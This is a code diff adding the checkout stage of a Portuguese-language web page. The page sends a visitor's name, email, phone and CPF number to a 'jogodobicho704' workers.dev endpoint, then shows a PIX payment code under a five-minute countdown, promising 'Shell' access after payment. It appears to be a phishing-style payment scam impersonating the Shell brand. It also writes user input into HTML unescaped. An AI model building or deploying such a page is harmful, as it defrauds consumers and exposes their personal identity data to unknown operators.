+  const url='https://pix-api.jogodobicho704.workers.dev/'
+    +'?name='+encodeURIComponent(state.name)
+    +'&email='+encodeURIComponent(state.email)
+    +'&phone='+encodeURIComponent(state.phone)
+    +'&document='+encodeURIComponent(state.cpf);
+
+  fetch(url)
+    .then(r=>{ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
+    .then(json=>{
+      const d = (json && json.data) ? json.data : json;
+      if(!d) throw new Error('empty');
+      clearInterval(mInt); clearInterval(fInt);
+      pb.style.width='100%'; pm.textContent='Cobrança gerada com sucesso!';
+      state.transaction_id   = d.transaction_id || '';
+      state.pix_copia_e_cola = d.pix_copia_e_cola || '';
+      state.pix_qr_code      = d.pix_qr_code || '';      
+      state.pix_base64       = d.pix_base64 || '';       
+      setTimeout(()=>goTo(11), 700);
+    })
+    .catch(()=>{
+      clearInterval(mInt); clearInterval(fInt);
+      pm.textContent='Falha na conexão.';
+      errBox.style.display='block';
+    });
+  return s;
+}
+
+// ─── S11 – CHECKOUT PIX ──────────────────────────────────────────────────────
+function s11(s){
+  const qrUrl    = state.pix_qr_code || '';
+  const b64raw   = state.pix_base64  || '';
+  const qrSrc    = qrUrl ? qrUrl : (b64raw.length > 40 ? 'data:image/png;base64,' + b64raw : '');
+  const code     = state.pix_copia_e_cola || '';
+  const txid     = state.transaction_id   || '—';
+
+  s.innerHTML=`<div class="box">
+    <div class="tag"><span class="dot"></span>Pagamento PIX</div>
+    <h1><em>${state.name}</em>, seu PIX está pronto!</h1>
+    <div class="timer">
+      <span>⏱</span>
+      <div id="tdisp">05:00</div>
+      <span class="tlbl">para concluir o pagamento</span>
+    </div>
+    ${qrSrc ? `<div class="qr-wrap"><img src="${qrSrc}" alt="QR Code PIX" onerror="this.parentElement.style.display='none'"></div>` : ''}
+    <div class="field">
+      <label>PIX Copia e Cola</label>
+      <div class="pix-code" id="pixcode">${code || '<em style="color:var(--muted)">Código não disponível</em>'}</div>
+    </div>
+    <button class="btn" id="copybtn">📋 Copiar código PIX</button>
+    <div class="status">
+      <div class="sdot" id="sdot"></div>
+      <span id="stxt">Aguardando pagamento...</span>
+    </div>
+    <div class="card" style="text-align:center">
+      <p style="font-size:12.5px;color:var(--muted)">Após o pagamento, seu acesso ao <b style="color:var(--fuel)">Shell</b> será liberado automaticamente.<br>Verifique o e-mail <b>${state.email}</b>.</p>
+    </div>
+    <div style="font-size:11px;color:var(--muted);text-align:center">ID: ${txid}</div>
+  </div>`;
+
+  // copy button
+  s.querySelector('#copybtn').addEventListener('click', function(){
+    if(!code){ this.textContent='⚠️ Código indisponível'; return; }
+    const self=this;
+    function done(){ self.textContent='✅ Copiado!'; setTimeout(()=>self.textContent='📋 Copiar código PIX',3000); }
+    if(navigator.clipboard && window.isSecureContext){
+      navigator.clipboard.writeText(code).then(done).catch(()=>{ fallbackCopy(code); done(); });
+    } else { fallbackCopy(code); done(); }
+  });
+
+  function fallbackCopy(txt){
+    const ta=document.createElement('textarea');
+    ta.value=txt; ta.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0';
+    document.body.appendChild(ta); ta.focus(); ta.select();
+    try{ document.execCommand('copy'); }catch(e){}
+    document.body.removeChild(ta);
+  }
+
+  // countdown 5 min
+  _timer && clearInterval(_timer);
+  let secs=300;
+  const td=s.querySelector('#tdisp');
+  _timer=setInterval(()=>{
+    secs--;
+    if(secs<=0){ clearInterval(_timer); td.textContent='00:00'; td.style.color='#555'; return; }
+    td.textContent=String(Math.floor(secs/60)).padStart(2,'0')+':'+String(secs%60).padStart(2,'0');
+    if(secs<=60) td.style.color='var(--danger)';
+  },1000);
+
+  return s;
+}
+
+// ─── START ───────────────────────────────────────────────────────────────────
+goTo(0);
+</script>
+</body>
+</html>
